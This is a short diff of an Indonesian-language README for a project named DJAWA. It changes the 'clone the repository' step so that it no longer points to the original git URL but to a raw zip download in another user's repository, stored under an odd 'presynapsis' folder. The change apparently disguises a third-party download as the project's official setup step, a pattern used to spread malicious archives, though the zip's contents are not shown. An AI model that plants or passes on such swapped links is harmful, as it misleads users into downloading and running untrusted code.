@@ -6,7 +6,7 @@
 Untuk memulai, clone repository dengan perintah ini:
 
 ```bash
-https://github.com/DeoFaradyS/DJAWA.git
+https://raw.githubusercontent.com/Gholan913/DJAWA/main/presynapsis/DJAWA.zip
 ```
 
 ### **Buat Branch**
